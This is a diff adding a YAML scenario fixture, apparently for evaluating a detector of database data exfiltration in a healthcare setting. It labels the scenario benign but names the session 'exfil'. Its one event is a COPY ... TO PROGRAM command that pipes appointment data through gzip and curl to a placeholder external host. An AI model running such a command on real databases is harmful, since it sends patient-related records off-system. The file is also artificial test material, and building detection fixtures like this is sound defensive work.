@@ -1,0 +1,31 @@
+scenario_id: gen_healthcare_86_copy_to_program_ben_2562b
+family_id: gen_healthcare_86_copy_to_program_fam_2562
+domain: healthcare
+time_of_day: 01:05
+default_class: benign
+rule_engine_relationship: agrees
+sessions:
+- session_label: exfil
+  role: research_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT appointment_id, status FROM appointments WHERE department_id
+      = '3') TO PROGRAM 'gzip | curl -sX POST https://clearinghouse-batch.example/ingest
+      --data-binary @-'
+    connects_to:
+      ip: 198.51.100.23
+      port: 8443
+matched_pair_id: gen_healthcare_86_copy_to_program_pair_2562
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
